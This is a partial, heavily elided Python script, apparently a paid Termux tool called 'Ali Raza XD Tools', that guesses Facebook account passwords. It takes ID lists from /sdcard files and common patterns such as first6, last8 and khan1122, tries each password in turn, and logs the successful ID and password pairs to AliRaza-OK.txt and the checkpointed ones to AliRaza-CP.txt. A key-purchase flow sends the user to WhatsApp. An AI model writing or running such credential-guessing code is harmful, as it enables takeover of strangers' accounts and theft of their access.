...
\033[1;37m__________________________________""")
...
def public():
        ...
        try:
                ...
                print('\033[1;32m exp: first8,first6,last8,last6,khan1122 etc')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' Put file example:  /sdcard/ZXG.txt  etc..')
                                ...
                                print('\033[1;32m exp: first6,first8,last6,last8,last1122 etc')
                                ...
                                os.system('xdg-open https://www.facebook.com/100011413126401/posts/pfbid0PgDF9Ph4mgcQZKhHmmubwMTNDsPBwuY9PaBGWk92F85FUdnZk94Un7g3AArw6kogl/?app=fbl');menu()

                        elif xd in ['0','00']:

                                exit(' Thanks for use Raza ')
                        ...
                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid Ali Raza XD Tools Version 13.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python ZXG.py')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                open('/sdcard/AliRaza-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/AliRaza-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/AliRaza-OK.txt','r').read()
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        open('/sdcard/AliRaza-OK.txt','a').write(uid+'|'+pas+'\n')
